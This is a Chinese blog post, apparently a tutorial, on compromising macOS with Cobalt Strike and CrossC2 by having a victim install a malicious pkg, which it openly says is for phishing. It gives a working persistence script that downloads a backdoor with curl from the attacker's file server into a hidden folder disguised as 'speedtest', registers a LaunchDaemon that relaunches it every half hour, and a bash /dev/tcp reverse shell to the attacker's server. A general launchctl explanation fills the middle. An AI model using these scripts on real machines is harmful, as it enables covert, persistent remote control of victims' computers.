你的Mac真的安全吗？｜Cobalt Strike 篇
2022-05-04 12:10:26

前言：

Cobalt Strike 是一个为对手模拟和红队行动而设计的平台，主要用于执行有目地的攻击和模拟高级威胁者的后渗透行动。本篇文章涉及以下几部分：安装CrossC2插件、服务器搭建Web Delivery、使用CobaltStrike攻陷Mac系统、持久化控制、反弹Mac系统shell。

  * 测试环境：外网vps一台（39.x.x.x）、macOS Big Sur 11.1 版本、CS 4.3版本、CrossC2 v3.0.2

  * 用于钓鱼（你懂得）

  * 达成效果：当你安装了pkg包，输入了密码，攻击者就得到了你的一个持久shell

  * 这里记录分享一下，如有错误欢迎各位师傅评论指正

一、 环境配置

1.服务器安装CS服务端：

首先，在vps安装Cobalt Strike 服务端

参考

https://syunaht.com/p/1120311950.html

https://github.com/Twi1ight/CSAgent

容易踩坑的点，给小白补充一下

服务端新建脚本文件/root/Start_CS.sh

vi /root/Start_CS.sh

#!/bin/bash
cd /root/CSAgent	//你CSAgent的目录
./teamserver 39.x.x.x Your_Pass  //启动命令


并给你的脚本文件可执行权限

sudo chmod 777 /root/Start_CS.sh


接下来采用systemctl服务方式，便于vps开机后，我们的CS服务端自动执行：

参考 https://gao4.top/368.html

sudo vi /lib/systemd/system/CS.service

[Unit]
Description=CS_Server service
After=network.target syslog.target
Wants=network.target

[Service]
Type=simple
ExecStart=/root/Start_CS.sh  //这里写你脚本的位置

[Install]
WantedBy=multi-user.target


  * 启动CS服务端：sudo systemctl start CS

  * 打开自启动：sudo systemctl enable CS

  * 重启应用：sudo systemctl restart CS

  * 停止应用：sudo systemctl stop CS

  * 查看应用：sudo systemctl status CS

如图所示，证明你的服务端已经运行起来了

三、服务器搭建Web Delivery、持久化设置

1.这里需要注意的有几点

  * 在后面涉及到制作pkg包的时候，导致root权限，beacon无回显

  * mac反弹shell存在一定问题，mac无/dev/tcp/，无法通过正常命令反弹shell

这里我采取了手动搭建web delivery 解决

首先在服务器下，新建一个目录，并在其中，使用python建立一个简单的文件服务器

＃如果上面返回的Python版本是3.X 
python -m http.server 端口
＃如果上面返回的Python版本是2.X 
python -m SimpleHTTPServer 端口


在其中放置三个文件

t_cc2.out //后门文件

a // 持久控制脚本

index.php //反弹shell脚本

a文件如下

sudo mkdir /Library/LaunchDaemons/.speedtest; rm -f /Library/LaunchDaemons/.speedtest/update; curl -A O -L http://ip:文件服务器端口/t_cc2.out -o /Library/LaunchDaemons/.speedtest/update; chmod 755 /Library/LaunchDaemons/.speedtest/update; /Library/LaunchDaemons/.speedtest/update; sleep 5;
sudo echo "sleep 30; /Library/LaunchDaemons/.speedtest/update;" >/Library/LaunchDaemons/.speedtest/smss.sh;
sudo chmod 777 /Library/LaunchDaemons/.speedtest/smss.sh;
sudo echo '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <!-- Label唯一的标识 -->
  <key>Label</key>
  <string>com.speedtest</string>
	<key>StartCalendarInterval</key>
	<dict>
		<key>Minute</key>
		<integer>10</integer>
		<key>Hour</key>
		<integer>15</integer>
	</dict>
	<key>StandardOutPath</key>
	<string>/Library/LaunchDaemons/outlog</string>
	<key>StandardErrorPath</key>
	<string>/Library/LaunchDaemons/errlog</string>
	<!-- 是否开机自启 -->
  <key>RunAtLoad</key>
      <true/>
  <!-- 定时重新执行，单位为秒，这里是半小时派生一个新shell -->
  <key>StartInterval</key>
      <integer>1800</integer>
  <key>ProgramArguments</key>
  <array>
    <string>/Library/LaunchDaemons/.speedtest/smss.sh</string>
  </array>
</dict>
</plist>
' > /Library/LaunchDaemons/com.speedtest.plist;
sleep 3;
sudo chmod 600 /Library/LaunchDaemons/com.speedtest.plist;
sudo launchctl unload -w /Library/LaunchDaemons/com.speedtest.plist;
sudo launchctl load -w /Library/LaunchDaemons/com.speedtest.plist;
sudo launchctl start /Library/LaunchDaemons/com.speedtest.plist;


index.php文件如下

bash -i >& /dev/tcp/39.x.x.x(服务器ip)/2333(服务器nc -lvp 监听的端口) 0>&1


这里需要补充的知识点是，mac开机自启，可以通过launchctl来进行

2.launchctl介绍：

参考 https://0clickjacking0.github.io/2020/05/20/macos%E8%AE%BE%E7%BD%AE%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E4%BB%BB%E5%8A%A1/

launchctl是一个统一的服务管理框架，启动、停止和管理守护进程、应用程序、进程和脚本。下面讲述一下如何在Mac上使用launchctl执行定时任务。

(1) plist的作用

launchctl 将根据plist文件的信息来启动任务。
plist脚本一般存放在以下目录：

  * /Library/LaunchDaemons–>只要系统启动了，哪怕用户不登陆系统也会被执行

  * /Library/LaunchAgents–>当用户登陆系统后才会被执行

更多的plist存放目录：

~/Library/LaunchAgents 由用户自己定义的任务项
/Library/LaunchAgents 由管理员为用户定义的任务项
/Library/LaunchDaemons 由管理员定义的守护进程任务项
/System/Library/LaunchAgents 由Mac OS X为用户定义的任务项
/System/Library/LaunchDaemons 由Mac OS X定义的守护进程任务项

plist文件示例：

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC -//Apple Computer//DTD PLIST 1.0//EN
http://www.apple.com/DTDs/PropertyList-1.0.dtd >
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.example.exampled</string>
    <key>ProgramArguments</key>
    <array>
         <string>exampled</string>
    </array>
    <key>KeepAlive</key>
    <true/>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>


对于上面plist文件部分键值说明：

Label (必须)

该项服务的名称，且文件名必须和Label一致，比如上述的plist文件，文件名就叫com.example.exampled.plist

ProgramArguments

指定可执行文件路径及其参数，比如执行ls -a，对应到该配置中，应该写作：

<key>ProgramArguments</key>
<array>
     <string>ls</string>
     <string>-a</string>
</array>


RunAtLoad (可选)

标识launchd在加载完该项服务之后立即启动路径指定的可执行文件。默认值为 false,设置为 true 即可实现开机运行脚本文件。

StartCalendarInterval(可选)

该关键字可以用来设置定时执行可执行程序，可使用 Month, Day, Hour, Minute, Second等子关键字，它可以指定脚本在多少月，天，小时，分钟，秒，星期几等时间上执行，若缺少某个关键字则表示任意该时间点，类似于 Unix 的 Crontab 计划任务的设置方式，比如在该例子中设置为每小时的20分的时候执行该命令。

KeepAlive（可选）

是否保持持续运行

所有key关键字详细使用说明可以在Mac OS X终端下使用命令man launchd.plist查询

更多请参考：https://www.manpagez.com/man/5/launchd.plist/

(2) launchctl的一些常用的命令

检测plist文件语法是否有错误

plutil local.localhost.startup.plist


注：以下服务如果需要用sudo才能启动的，需要在命令前加入sudo

载入配置, 使配置生效

# 加载启动任务
launchctl load ~/Library/LaunchAgents/example.plist

# 加载任务, -w选项会在下次登录/重新启动时重新启动。
launchctl load -w ~/Library/LaunchAgents/example.plist


停止服务

sudo launchctl stop <path>


开始服务

sudo launchctl start <path>


kill服务

sudo launchctl kill <path>


卸载任务

# 停止并卸载任务。下次登录/重新启动时，任务仍将重新启动。
launchctl unload ~/Library/LaunchAgents/example.plist

# 该任务将不会在下次登录/重新启动时重新启动。
launchctl unload -w ~/Library/LaunchAgents/example.plist


查看服务运行状态

launchctl list
sudo launchctl list（有时候一些需要用sudo才能执行的服务就需要用sudo才能查看）


输出具有以下含义：

第一个数字是进程的PID，如果它正在运行，如果它不运行，它显示一个’ - ‘。
第二个数字是进程的退出代码（如果它已经完成）。如果是负数，则是杀死信号的数量。
第三列是进程名称。

下面这个就说明开机启动nginx服务已经成功了

注意：执行launchctl命令加sudo与不加结果是完全不同的。

3.持续化脚本文件详解

<!-- 这部分和CrossC2生成的脚本类似，创建目录，下载后门文件并赋予权限，运行 -->
sudo mkdir /Library/LaunchDaemons/.speedtest; rm -f /Library/LaunchDaemons/.speedtest/update; curl -A O -L http://ip:文件服务器端口/t_cc2.out -o /Library/LaunchDaemons/.speedtest/update; chmod 755 /Library/LaunchDaemons/.speedtest/update; /Library/LaunchDaemons/.speedtest/update; sleep 5;

<!-- 这部分是持续化重启上线 -->

<!-- 将运行后门的脚本，写入smss.sh -->
sudo echo "sleep 30; /Library/LaunchDaemons/.speedtest/update;" >/Library/LaunchDaemons/.speedtest/smss.sh;
<!-- 赋予权限 -->
sudo chmod 777 /Library/LaunchDaemons/.speedtest/smss.sh;
<!-- 写入持续化plist，注意这几个参数，Lable、StartCalendarInterval、RunAtLoad(开机自启)、StartInterval(间隔多久重新运行脚本) -->
sudo echo '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <!-- Label唯一的标识 -->
  <key>Label</key>
  <string>com.speedtest</string>
	<key>StartCalendarInterval</key>
	<dict>
		<key>Minute</key>
		<integer>10</integer>
		<key>Hour</key>
		<integer>15</integer>
	</dict>
	<key>StandardOutPath</key>
	<string>/Library/LaunchDaemons/outlog</string>
	<key>StandardErrorPath</key>
	<string>/Library/LaunchDaemons/errlog</string>
	<!-- 是否开机自启 -->
  <key>RunAtLoad</key>
      <true/>
  <!-- 定时重新执行，单位为秒，这里是半小时派生一个新shell -->
  <key>StartInterval</key>
      <integer>1800</integer>
  <key>ProgramArguments</key>
  <array>
    <string>/Library/LaunchDaemons/.speedtest/smss.sh</string>
  </array>
</dict>
</plist>
' > /Library/LaunchDaemons/com.speedtest.plist;

<!-- 赋予权限，激活服务 -->
sleep 3;
sudo chmod 600 /Library/LaunchDaemons/com.speedtest.plist;
sudo launchctl unload -w /Library/LaunchDaemons/com.speedtest.plist;
sudo launchctl load -w /Library/LaunchDaemons/com.speedtest.plist;
sudo launchctl start /Library/LaunchDaemons/com.speedtest.plist;

工具

pakeages 下载：http://s.sudre.free.fr/Software/Packages/about.html

Packages是一款开源的安装包制作工具，主要有两种模式：

Distribution(分布模式)：这种模式下，安装包中可以包含多个组件，可以分别安装到指定的位置；

Raw Package(原始模式)： 只适用于只有一个安装组件(安装内容)的情况,一个组件(package)就是一个具备特定安装属性的部分，是对需要安装的程序的一个逻辑划分。比如一个安装包中包含两部分，一部分需要安装到系统目录，一部分安装到用户目录。从逻辑上就可以划分为两个组件(package)，分别为它们指定不同的安装属性。
